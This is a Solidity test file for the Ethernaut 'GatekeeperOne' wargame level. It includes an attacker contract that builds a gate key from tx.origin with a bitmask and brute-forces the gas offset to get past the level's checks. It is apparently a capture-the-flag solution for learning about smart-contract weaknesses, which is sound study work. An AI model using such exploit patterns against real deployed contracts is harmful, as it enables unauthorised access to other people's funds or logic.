// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {GatekeeperOneFactory} from "../src/factories/GatekeeperOneFactory.sol";
import {GatekeeperOne} from "../src/levels/GatekeeperOne.sol";

import "forge-std/console.sol";

contract GatekeeperOneTest is EthernautTest {
    GatekeeperOneFactory public factory;

    function setUp() public override {
        super.setUp();
        factory = new GatekeeperOneFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveGatekeeperOne() public {
        // GatekeeperOne keeper = GatekeeperOne(payable(levelAddress));

        // [START]

        // 1. Deploy attacker contract
        GatekeeperOneAttack attacker = new GatekeeperOneAttack(
            payable(levelAddress)
        );

        // 2. Call enter()
        for (uint256 i = 1; i <= 8191; i++) {
            try attacker.enter(i) {
                console.log("gas", i);
            } catch {}
        }

        // [END]

        assert(factory.validateInstance(payable(levelAddress), tx.origin));
    }
}

// Attacker contract
contract GatekeeperOneAttack {
    GatekeeperOne public target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function enter(uint gas) public returns (bool) {
        // k = uint64(_gateKey)
        // uint32(k) == uint16(k)
        // uint32(k) != k
        // uint32(k) == uint16(uint160(tx.origin))

        // k == uint160(tx.origin)
        // uint64(_gateKey) == uint160(tx.origin)
        uint64 u64 = uint64(uint160(tx.origin));

        bytes8 key = bytes8(u64) & 0xFFFFFFFF0000FFFF;

        bool result = target.enter{gas: 8191 * 10 + gas}(key);
        return result;
    }
}
